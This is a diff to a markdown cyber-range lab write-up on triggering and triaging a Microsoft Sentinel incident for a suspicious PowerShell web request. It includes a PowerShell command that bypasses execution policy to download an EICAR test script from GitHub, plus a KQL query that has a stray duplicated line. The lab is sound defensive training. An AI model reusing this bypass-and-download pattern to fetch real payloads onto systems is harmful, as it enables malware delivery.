@@ -97,6 +97,72 @@ DeviceProcessEvents
 
 ---
 
+### 💣 Simulate Attack — Triggering the Alert
+
+In order to generate log activity that will trigger an Incident in Sentinel, I executed the following PowerShell command on the onboarded VM (`PVR-HUNTING2`) to simulate the attack:
+
+```powershell
+powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
+```
+---
+
+### 🕵️ Rule Triggered - Triage the Incident
+
+The simulated malicious PS script successfully triggered the Sentinel Analytics rule, the alert appears in Microsoft Sentinel under **Incidents**. I began the investigation:
+
+1. I Assigned the incident to myself and marked it Active.  
+2. I then reviewed the incident details to identify affected devices, users, and commands.
+
+![Incident Overview](images/map5.png)
+
+<br>
+
+### 🔎 Event details on Microsoft Sentinel incident page:
+
+**![Simulated Execution](images/IR_IMG4.png)**
+
+**Simulated User Behavior**:  
+Upon contacting the (simulated) user, they report attempting to install free software, possibly triggering the download of the script.
+
+**Entity Mapping Observed**:
+- PowerShell Suspicious Web Request was triggered on **1 device** by **1 user**.  
+- The PowerShell command downloaded the following script:  
+  - URL: https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1
+
+---
+
+### 🧪 Confirm Script Execution
+
+To confirm whether the downloaded script was executed, run this query:
+
+```kusto
+DeviceProcessEvents
+let TargetHostname = "pvr-hunting2";
+let ScriptNames = dynamic(["eicar.ps1"]);
+DeviceProcessEvents
+| where DeviceName == TargetHostname
+| where FileName == "powershell.exe"
+| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
+| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
+| order by TimeGenerated
+```
+
+![Execution Confirmation](images/DidItRun6.png)
+
+✅ The logs confirm that `eicar.ps1` was executed. 
+
+---
+
+
+
+
+
+
+
+
+
+
+
 ## 🛠️ Work the Incident (NIST 800-61 Lifecycle)
 
 ### 1️⃣ Preparation
